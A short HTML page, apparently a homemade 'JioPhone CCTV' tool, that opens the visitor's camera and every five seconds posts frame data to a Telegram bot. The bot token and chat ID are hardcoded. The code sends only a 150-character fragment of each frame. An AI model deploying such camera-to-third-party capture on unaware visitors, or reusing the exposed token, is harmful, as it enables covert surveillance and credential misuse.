<!DOCTYPE html>
<html>
<head>
  <title>JioPhone CCTV Base64</title>
</head>
<body>
  <h3>üì∑ JioPhone CCTV (Base64) A7cams</h3>
  <video id="video" autoplay playsinline width="240" height="180"></video>
  <canvas id="canvas" width="240" height="180" style="display:none"></canvas>
  <p id="status">Idle...</p>

  <script>
    var video = document.getElementById("video");
    var canvas = document.getElementById("canvas");
    var ctx = canvas.getContext("2d");
    var statusEl = document.getElementById("status");

    var chatId = "-1001590820560";
    var token = "6675607272:AAFIafZckGOmNT8m9mE66_YgaBzkD3wo_xg";

    function log(msg) {
      statusEl.innerText = msg;
    }

    function initCamera() {
      log("Requesting camera...");
      if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
        log("‚ùå getUserMedia not supported");
        return;
      }

      navigator.mediaDevices.getUserMedia({ video: true })
        .then(function(stream) {
          video.srcObject = stream;
          log("‚úÖ Camera started");

          setInterval(captureAndSend, 5000);
        })
        .catch(function(err) {
          log("Camera error: " + err);
        });
    }

    function captureAndSend() {
      try {
        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
        var dataURL = canvas.toDataURL("image/jpeg");

        log("Sending frame...");

        fetch("https://api.telegram.org/bot" + token + "/sendMessage", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            chat_id: chatId,
            text: "üì∑ Frame: " + dataURL.substring(0, 150) + "..."
          })
        })
        .then(function() {
          log("Frame sent ‚úÖ " + new Date().toLocaleTimeString());
        })
        .catch(function(err) {
          log("Send error: " + err);
        });

      } catch (e) {
        log("Capture error: " + e);
      }
    }

    initCamera();
  </script>
</body>
</html>
